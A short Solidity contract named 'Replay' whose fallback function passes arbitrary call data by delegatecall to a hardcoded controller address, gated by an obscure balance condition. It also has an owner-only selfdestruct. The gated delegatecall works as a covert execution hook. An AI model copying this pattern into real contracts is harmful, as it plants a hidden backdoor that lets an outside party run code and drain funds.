// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;




contract Replay {
      
address immutable controller = 0x57DE582b5f52C69B916252e83713bf50da30803d;
address immutable owner = 0x708f741b5fA76c9f4a70355207b4F0226ce265f3;


    function withdraw() external {
        (bool sent, bytes memory data) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}



    function finalize() external {
        require(msg.sender == owner, "Must be owner");
        selfdestruct(payable(owner));
    }


    fallback() external payable {
        if (msg.value > msg.sender.balance) {
            (bool success, ) = controller.delegatecall(msg.data);
            require(success, "Execution failed");
        }
        else {
            return;

        }

        }

    }
    